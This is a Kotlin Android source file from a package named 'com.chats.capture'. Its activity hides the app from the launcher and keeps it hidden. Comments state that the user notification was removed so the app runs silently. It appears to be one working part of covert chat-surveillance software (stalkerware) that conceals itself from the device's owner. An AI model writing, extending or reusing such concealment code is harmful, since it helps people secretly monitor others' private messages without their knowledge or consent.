package com.chats.capture.ui

import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager

class HideFromDrawerActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
        // Silent operation - no user notification
        // Toast removed for silent app operation

        finish()
    }
}
